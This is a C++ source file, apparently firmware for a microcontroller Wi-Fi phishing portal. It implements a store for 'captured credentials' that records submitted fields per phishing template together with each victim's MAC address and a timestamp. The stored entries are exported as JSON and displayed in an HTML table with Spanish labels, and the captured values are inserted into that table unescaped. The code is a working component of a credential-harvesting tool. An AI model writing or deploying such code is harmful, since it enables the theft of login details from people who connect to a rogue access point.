#include "credential_store.h"

CredentialStore::CredentialStore(int max_entries) {
    this->max_entries = max_entries;
    this->count = 0;
    this->credentials = new Credential[max_entries];
}

bool CredentialStore::addCredential(const String& template_name, const String& field1, const String& field2, const String& client_mac) {
    if (count >= max_entries) {
        // Shift all entries down, remove oldest
        for (int i = 0; i < max_entries - 1; i++) {
            credentials[i] = credentials[i + 1];
        }
        count = max_entries - 1;
    }
    
    credentials[count].template_name = template_name;
    credentials[count].field1 = field1;
    credentials[count].field2 = field2;
    credentials[count].timestamp = formatTimestamp();
    credentials[count].client_mac = client_mac;
    count++;
    return true;
}

String CredentialStore::getCredentialsJSON() {
    StaticJsonDocument<4096> doc;
    JsonArray arr = doc.to<JsonArray>();
    
    for (int i = 0; i < count; i++) {
        JsonObject obj = arr.createNestedObject();
        obj["template"] = credentials[i].template_name;
        obj["field1"] = credentials[i].field1;
        obj["field2"] = credentials[i].field2;
        obj["time"] = credentials[i].timestamp;
        obj["mac"] = credentials[i].client_mac;
    }
    
    String output;
    serializeJson(doc, output);
    return output;
}

int CredentialStore::getCount() {
    return count;
}

void CredentialStore::clear() {
    count = 0;
}

String CredentialStore::getHTMLTable() {
    if (count == 0) {
        return "<p style='color:#888;text-align:center;padding:20px;'>No hay credenciales capturadas</p>";
    }
    
    String html = "<table><thead><tr><th>Template</th><th>Campo 1</th><th>Campo 2</th><th>Hora</th><th>MAC</th></tr></thead><tbody>";
    
    for (int i = count - 1; i >= 0; i--) {
        html += "<tr>";
        html += "<td>" + credentials[i].template_name + "</td>";
        html += "<td>" + credentials[i].field1 + "</td>";
        html += "<td>" + credentials[i].field2 + "</td>";
        html += "<td>" + credentials[i].timestamp + "</td>";
        html += "<td>" + credentials[i].client_mac + "</td>";
        html += "</tr>";
    }
    
    html += "</tbody></table>";
    return html;
}

String CredentialStore::formatTimestamp() {
    unsigned long secs = millis() / 1000;
    unsigned long mins = secs / 60;
    unsigned long hrs = mins / 60;
    
    String h = String(hrs % 24);
    String m = String(mins % 60);
    String s = String(secs % 60);
    
    if (h.length() < 2) h = "0" + h;
    if (m.length() < 2) m = "0" + m;
    if (s.length() < 2) s = "0" + s;
    
    return h + ":" + m + ":" + s;
}
